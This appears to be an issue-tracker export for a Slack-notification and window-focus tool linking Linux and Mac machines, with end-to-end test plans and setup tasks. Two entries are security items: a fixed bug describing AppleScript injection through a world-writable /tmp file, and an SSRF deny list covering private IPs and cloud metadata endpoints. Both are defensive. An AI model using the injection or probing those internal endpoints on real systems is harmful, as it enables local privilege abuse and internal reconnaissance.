{"id":"csn-qv2","title":"[Phase 0] Create cross-machine E2E tests","description":"# Cross-Machine E2E Tests\n\nLinux triggers action, Mac validates result.\n\n## Files to Create\n\n```\ntests/e2e/cross-machine/\n├── test-focus-forward.sh         # Linux→Mac focus forwarding\n├── test-mac-tunnel-stale.sh      # .mac-tunnel-url stale detection\n└── test-tunnel-reconnect.sh      # SSH disconnect/reconnect\n```\n\n## Test Details\n\n### test-focus-forward.sh\n```bash\n# From Linux:\nMAC_HOST=\"gts-macbook-air-1\"\n\n# Get current Mac frontmost app\nBEFORE=$(ssh $MAC_HOST 'osascript -e \"tell application \\\"System Events\\\" to get name of first process whose frontmost is true\"')\n\n# Trigger focus via remote-relay\ncurl -X POST http://localhost:8464/slack/focus \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"focus_url\": \"claude-focus://local-tmux/test-session\"}'\n\nsleep 1\n\n# Verify Mac focus changed\nAFTER=$(ssh $MAC_HOST 'osascript -e \"tell application \\\"System Events\\\" to get name of first process whose frontmost is true\"')\n\nassert_equals \"$AFTER\" \"iTerm2\"\n```\n\n### test-mac-tunnel-stale.sh\n```bash\n# From Linux:\n\n# Save current .mac-tunnel-url\ncp ~/.claude/.mac-tunnel-url ~/.claude/.mac-tunnel-url.backup\n\n# Write stale URL\necho \"https://stale-url.example.com\" \u003e ~/.claude/.mac-tunnel-url\n\n# Trigger focus (should fail gracefully)\nRESPONSE=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n  -X POST http://localhost:8464/slack/focus \\\n  -d '{\"focus_url\": \"claude-focus://local-tmux/test\"}')\n\n# Should get error response, not hang\nassert_not_equals \"$RESPONSE\" \"000\"  # 000 = connection timeout\n\n# Restore\nmv ~/.claude/.mac-tunnel-url.backup ~/.claude/.mac-tunnel-url\n```\n\n### test-tunnel-reconnect.sh\n```bash\n# Verify session survives SSH disconnect\n\n# 1. Create SSH session from Mac to Linux\n# 2. Register session on Linux\n# 3. Disconnect SSH (close terminal)\n# 4. Reconnect SSH\n# 5. Verify tmux session still exists\n# 6. Verify button clicks still work\n```\n\n## Running Cross-Machine Tests\n```bash\n# From Linux (requires Mac reachable via `ssh mac`):\n./tests/e2e/run-tests.sh cross-machine\n```\n\n## Acceptance Criteria\n- [ ] All 3 tests pass\n- [ ] Tests handle Mac being unreachable gracefully\n- [ ] Tests don't leave stale state\n\n## Dependencies\n- csn-8wn (E2E test runner and lib)\n- csn-5a7 (Linux E2E tests - need registration working)\n- csn-xlm (Mac E2E tests - need focus working)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-24T07:57:06.425163342-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:57:06.425163342-08:00","dependencies":[{"issue_id":"csn-qv2","depends_on_id":"csn-8wn","type":"blocks","created_at":"2026-01-24T07:59:21.466911111-08:00","created_by":"playerzer0x"},{"issue_id":"csn-qv2","depends_on_id":"csn-5a7","type":"blocks","created_at":"2026-01-24T07:59:21.487312302-08:00","created_by":"playerzer0x"},{"issue_id":"csn-qv2","depends_on_id":"csn-xlm","type":"blocks","created_at":"2026-01-24T07:59:21.508603214-08:00","created_by":"playerzer0x"}]}
{"id":"csn-r6w","title":"Add jq dependency check and warning","description":"When jq is missing, notifications show 'minimal text' without transcript context. Add explicit jq check during install with helpful install instructions.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-19T16:25:10.491419-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:30:58.639777-08:00","closed_at":"2026-01-19T16:30:58.639777-08:00","close_reason":"Added jq check with install instructions","dependencies":[{"issue_id":"csn-r6w","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.341183-08:00","created_by":"playerzer0x"}]}
{"id":"csn-say","title":"Document MCP server setup and ngrok","description":"Update README with MCP server usage, document ngrok setup for mobile, document Slack app configuration","status":"closed","priority":3,"issue_type":"task","created_at":"2026-01-19T14:24:47.243819-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:36:37.513465-08:00","closed_at":"2026-01-19T16:36:37.513465-08:00","close_reason":"Added MCP Server section to README with ngrok and Slack interactivity setup","dependencies":[{"issue_id":"csn-say","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.488694-08:00","created_by":"playerzer0x"},{"issue_id":"csn-say","depends_on_id":"csn-c8z","type":"blocks","created_at":"2026-01-19T14:25:12.118589-08:00","created_by":"playerzer0x"}]}
{"id":"csn-sp5","title":"Include task context in Slack notifications","description":"Currently notifications just say 'Task completed after Xs' without context about what was done. Should include the last action/message so users know what to expect when they return.","status":"closed","priority":1,"issue_type":"feature","created_at":"2026-01-18T15:12:38.341975-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:16:25.612087-08:00","closed_at":"2026-01-18T15:16:25.612087-08:00","close_reason":"Added context parameter to start/check commands. PreToolUse hooks now store context (Running command, Editing files, Running agent, Reading files). Notification shows 'Finished: \u003ccontext\u003e (Xs)' instead of generic message."}
{"id":"csn-wiw","title":"HIGH: World-writable IPC via /tmp file","description":"The LaunchAgent in install.sh:68-87 polls /tmp/claude-focus-request which any local user can write to. The ClaudeFocus.app also writes to this file (lines 95-97).\n\n**Risk**: Any local user/process can inject malicious URLs to trigger AppleScript execution in your context.\n\n**Fix**: Use a user-specific path ($TMPDIR or ~/.claude/) with proper permissions (0600).","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-18T14:58:40.66507-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:05:01.165795-08:00","closed_at":"2026-01-18T15:05:01.165795-08:00","close_reason":"Changed IPC file from world-writable /tmp/claude-focus-request to user-owned ~/.claude/focus-request. AppleScript now uses 'umask 077' to create the file with 0600 permissions. LaunchAgent updated to read from the same secure location."}
{"id":"csn-wmf","title":"Add tunnel URL validation (SSRF protection)","description":"CRITICAL SECURITY: Validate tunnel URLs before forwarding. Block private IPs (127.*, 10.*, 192.168.*, 169.254.*), localhost, cloud metadata endpoints. Require HTTPS. Prevents attackers from registering malicious URLs to probe internal services. See docs/public-relay-plan.md Security Model section 3.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-23T12:31:12.794101299-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:31:12.794101299-08:00","dependencies":[{"issue_id":"csn-wmf","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:31:31.442848317-08:00","created_by":"playerzer0x"},{"issue_id":"csn-wmf","depends_on_id":"csn-c4x","type":"blocks","created_at":"2026-01-23T12:31:35.422393446-08:00","created_by":"playerzer0x"}]}
{"id":"csn-xlm","title":"[Phase 0] Create Mac E2E tests","description":"# Mac E2E Tests\n\nRun via `ssh mac` from Linux, or directly on Mac.\n\n## Files to Create\n\n```\ntests/e2e/mac/\n├── test-focus-local-tmux.sh      # Focus local-tmux session\n├── test-focus-ssh-linked.sh      # Focus ssh-linked session\n├── test-focus-iterm-session.sh   # Focus by iTerm session ID\n├── test-thread-reply-mac.sh      # Thread reply to Mac terminal\n├── test-gastown-pattern.sh       # Validate preserved tmux input\n└── test-focus-minimization.sh    # Validate preserved minimization\n```\n\n## Critical Tests (Validate Preserved Behavior)\n\n### test-gastown-pattern.sh\nValidates the exact tmux command sequence works:\n```bash\n# Create test tmux session with cat (captures input)\ntmux new-session -d -s test-session 'cat \u003e /tmp/test-input'\n\n# Send input using gastown pattern\ntmux send-keys -t test-session:0.0 -l \"test input\"\nsleep 0.5\ntmux send-keys -t test-session:0.0 Escape\nsleep 0.1\ntmux send-keys -t test-session:0.0 Enter\n\n# Verify input was received\nsleep 0.2\nassert_file_contains /tmp/test-input \"test input\"\n```\n\n### test-focus-minimization.sh\nValidates minimization prevents focus stealing:\n```bash\n# Open two iTerm windows\n# Get window IDs\n# Focus window 1 using focus-helper\n# Verify window 1 is frontmost\n# Verify window 2 was NOT destroyed (restored after minimize)\n```\n\n### test-focus-local-tmux.sh\n```bash\n# Create tmux session via `claude-slack-notify launch`\n# Get the focus URL from instance file\n# Call focus-helper with URL\n# Verify correct window is frontmost\n```\n\n### test-focus-ssh-linked.sh\n```bash\n# Create link file for test SSH session\n# Call focus-helper with ssh-linked URL\n# Verify correct window is frontmost\n```\n\n## Acceptance Criteria\n- [ ] All 6 tests pass on Mac\n- [ ] test-gastown-pattern.sh validates preserved behavior\n- [ ] test-focus-minimization.sh validates preserved behavior\n- [ ] Tests work when run via `ssh mac` from Linux\n\n## Dependencies\n- csn-8wn (E2E test runner and lib)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)\n\n## IMPORTANT\nThese tests validate the \"DO NOT CHANGE\" mechanisms. If these tests fail after a refactor, the refactor broke something critical.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-24T07:56:51.687139688-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:56:51.687139688-08:00","dependencies":[{"issue_id":"csn-xlm","depends_on_id":"csn-8wn","type":"blocks","created_at":"2026-01-24T07:59:21.445721452-08:00","created_by":"playerzer0x"}]}
{"id":"csn-xmb","title":"Update README with simplified setup flow","description":"Update README.md to reflect new automated setup: add jq requirement, update setup steps to show new streamlined flow, add manifest instructions.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T16:25:31.357398-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:34:53.34958-08:00","closed_at":"2026-01-19T16:34:53.34958-08:00","close_reason":"Updated README with jq quick setup and manifest instructions","dependencies":[{"issue_id":"csn-xmb","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.375189-08:00","created_by":"playerzer0x"},{"issue_id":"csn-xmb","depends_on_id":"csn-85v","type":"blocks","created_at":"2026-01-19T16:26:14.077648-08:00","created_by":"playerzer0x"},{"issue_id":"csn-xmb","depends_on_id":"csn-654","type":"blocks","created_at":"2026-01-19T16:26:14.138108-08:00","created_by":"playerzer0x"},{"issue_id":"csn-xmb","depends_on_id":"csn-6rd","type":"blocks","created_at":"2026-01-19T16:26:14.195803-08:00","created_by":"playerzer0x"}]}
{"id":"csn-xwd","title":"Implement Slack signature verification","description":"lib/slack-verify.ts - Verify X-Slack-Signature header, store signing secret in ~/.claude/slack-signing-secret","status":"closed","priority":3,"issue_type":"task","created_at":"2026-01-19T14:24:47.079441-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:41:49.819472-08:00","closed_at":"2026-01-19T14:41:49.819472-08:00","close_reason":"Implemented Slack signature verification middleware with replay attack protection and development mode support","dependencies":[{"issue_id":"csn-xwd","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.48159-08:00","created_by":"playerzer0x"},{"issue_id":"csn-xwd","depends_on_id":"csn-on2","type":"blocks","created_at":"2026-01-19T14:25:11.914112-08:00","created_by":"playerzer0x"}]}
